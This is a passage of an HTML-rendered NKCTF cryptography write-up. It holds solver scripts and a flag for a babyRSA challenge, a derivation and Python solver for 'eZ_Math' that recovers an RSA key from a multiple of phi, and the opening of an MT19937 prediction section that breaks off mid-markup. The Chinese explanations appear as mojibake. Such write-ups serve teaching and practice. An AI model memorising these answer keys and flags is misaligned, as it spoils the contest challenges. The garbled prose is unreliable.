class="hljs-string">P=37269067352457630263351774206178494913957088859822110344334922741582406663357663275001777826744534556652993452577088773275825539553907027527722045884489297259984687894496505265384077983882580247333972954704644517469999916574893996324149548980338301147983367163067556434434982470623587914250041142380667816331</span><br><span class="hljs-string">assert N%P==0</span><br><span class="hljs-string">Q=N//P</span><br><span class="hljs-string">R.&lt;x&gt;=Zmod(n)[]</span><br><span class="hljs-string">f=x^2-(P+Q)*x+P*Q</span><br><span class="hljs-string">flag=f.small_roots(X=2^300)</span><br><span class="hljs-string">print(flag)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment">#NKCTF&#123;Th1S_a_babyRSA_y0u_are_tql!!!&#125;</span><br></code></pre></td></tr></table></figure><h2 id="eZ-Math">eZ_Math</h2><p>è€ƒç‚¹ï¼š</p><ol><li>æ•°è®ºæ¨å¯¼ï¼Œæ¬§æ‹‰å®šç†ï¼Œrsaå‚æ•°ä¹‹é—´çš„å…³ç³»ç­‰</li></ol><p>é¢˜ç›®ç»™äº†å¾ˆå¤š<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><msub><mi>a</mi><mi>i</mi></msub><msub><mi>x</mi><mi>i</mi></msub></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>n</mi><mo>=</mo><msub><mi>c</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">{a_i}^{x_i}\mod{n}={c_i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8144em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p><p>æ³¨æ„åˆ°<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>c</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">a_i,c_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>éƒ½å¾ˆå°ï¼Œè€Œä¸”æœ‰çš„<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">a_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>æ˜¯å¹‚æŒ‡å…³ç³»ï¼šå¦‚<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4</mn><mo>=</mo><msup><mn>2</mn><mn>2</mn></msup><mo separator="true">,</mo><mn>8</mn><mo>=</mo><msup><mn>2</mn><mn>3</mn></msup></mrow><annotation encoding="application/x-tex">4=2^2,8=2^3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">4</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0085em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">8</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span></span></span></span>,åœ¨ä¸åŒçš„åº•æ•°ä¸‹ï¼Œä¹Ÿå­˜åœ¨ç›¸åŒçš„<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>c</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">c_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>ã€‚</p><p>æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°å…¶ä¸­ä¸€ç»„å¹‚æŒ‡å…³ç³»çš„ï¼š<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>2</mn></msub><mo>=</mo><msup><msub><mi>a</mi><mn>1</mn></msub><mi>b</mi></msup></mrow><annotation encoding="application/x-tex">a_1,a_2={a_1}^b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9991em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">b</span></span></span></span></span></span></span></span></span></span></span>ï¼Œå¹¶ä¸”<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>c</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">c_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>ç›¸åŒçš„ã€‚</p><p>é‚£ä¹ˆæ­¤æ—¶<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>a</mi><mn>1</mn><msub><mi>x</mi><mn>1</mn></msub></msubsup><mo>=</mo><msub><mi>c</mi><mn>1</mn></msub><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">a_1^{x_1}=c_1\mod{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0126em;vertical-align:-0.2663em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7463em;"><span style="top:-2.4337em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.1449em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2663em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span>ï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><msub><mi>a</mi><mn>2</mn></msub><msub><mi>x</mi><mn>2</mn></msub></msup><mo>=</mo><msup><msub><mi>a</mi><mn>1</mn></msub><mrow><mi>b</mi><mo>âˆ—</mo><msub><mi>x</mi><mn>2</mn></msub></mrow></msup><mo>=</mo><msub><mi>c</mi><mn>1</mn></msub><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">{a_2}^{x_2}={a_1}^{b*x_2}=c_1\mod{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8144em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9991em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">b</span><span class="mbin mtight">âˆ—</span><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span></p><p>æ˜¾ç„¶æ­¤æ—¶æœ‰ï¼š<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>1</mn></msub><mo>=</mo><mi>b</mi><mo>âˆ—</mo><msub><mi>x</mi><mn>2</mn></msub><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>p</mi><mi>h</mi><mi>i</mi></mrow><annotation encoding="application/x-tex">x_1=b*x_2\mod{phi}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mord mathnormal">hi</span></span></span></span>ï¼Œï¼ˆæ¬§æ‹‰å®šç†ã€æˆ–è¯¥å¾ªç¯ç¾¤çš„é˜¶ä¸ºphi)</p><p>æ­¤æ—¶å¯ä»¥å¾—åˆ°phiçš„ä¸€ä¸ªå€æ•°<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mi>p</mi><mi>h</mi><mi>i</mi><mo>=</mo><msub><mi>x</mi><mn>1</mn></msub><mo>âˆ’</mo><mi>b</mi><mo>âˆ—</mo><msub><mi>x</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">kphi=x_1-b*x_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">p</span><span class="mord mathnormal">hi</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><p>å¾—åˆ°<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mo>=</mo><msup><mi>e</mi><mrow><mo>âˆ’</mo><mn>1</mn></mrow></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>k</mi><mi>p</mi><mi>h</mi><mi>i</mi></mrow><annotation encoding="application/x-tex">d=e^{-1}\mod{kphi}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">p</span><span class="mord mathnormal">hi</span></span></span></span>  (ç”¨phiçš„å€æ•°æ±‚ç§é’¥ä¸phiç­‰ä»·ï¼Œå¯ç”±æ¬§æ‹‰å®šç†å¾—)</p><p>ç„¶åè§£rsaå³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">a1=<span class="hljs-number">21606807968454766520529084107175158062623274703294799705984925156349373997035743632649715867216648159433730630939058861636582120303338699113498645592338621228070481894445156769437351313971471061779425442129487317917630554305634797690296919992201174927956121524640438775183413288101169580705360562693274958339417</span><br>b1=<span class="hljs-number">68789042322037899901399142739922213531190892214327212247633649397602243027562329029767224931385807659445647908974735092145336602662873465734923450809783198772444106655438821950560058413359621316189435942839212247873870560114926459781136160541556773230183543715576244986800296759341282346581691226676298068904581</span><br>n = <span class="hljs-number">369520637995317866367336688225182965061898803879373674073832046072914710171302486913303917853881549637806426191970292829598855375370563396182543413674021955181862907847280705741114636854238746612618069619482248639049407507041667720977392421249242597197448360531895206645794505182208390084734779667749657408715621</span><br>c = <span class="hljs-number">324131338592233305486487416176106472248153652884280898177125443926549710357763331715045582842045967830200123100144721322509500306940560917086108978796500145618443920020112366546853892387011738997522207752873944151628204886591075864677988865335625452099668804529484866900390927644093597772065285222172136374562043</span><br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br>phi=a1-<span class="hljs-number">3</span>*b1<br>e=<span class="hljs-number">65537</span><br>d=invert(e,phi)<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">pow</span>(c,d,n)))<br></code></pre></td></tr></table></figure><h2 id="fake-MTã€real-MT">fake_MTã€real_MT</h2><p>è€ƒç‚¹ï¼š</p><ol><li>MT19937çš„é¢„æµ‹ã€é€†å‘ï¼Œéƒ¨ä»¶çš„é€†å‘</li><li>pwntoolsè‡ªåŠ¨åŒ–è„šæœ¬</li></ol><p>1.å¯ä»¥å‚è€ƒ<a href="https://www.anquanke.com/post/id/205861?display=mobile%E5%AD%A6%E4%B9%A0%EF%BC%8C%E5%BE%88%E7%BB%8F%E5%85%B8%EF%BC%81%E5%BE%88%E6%9C%89%E6%84%8F%E6%80%9D">https://www.anquanke.com/post/id/205861?display=mobileå­¦ä¹ ï¼Œå¾ˆç»å…¸ï¼å¾ˆæœ‰æ„æ€</a></p><p>2.pwntoolsåŸºæœ¬ç”¨æ³•ï¼šæ¥å‘æ•°æ®ç­‰ç­‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 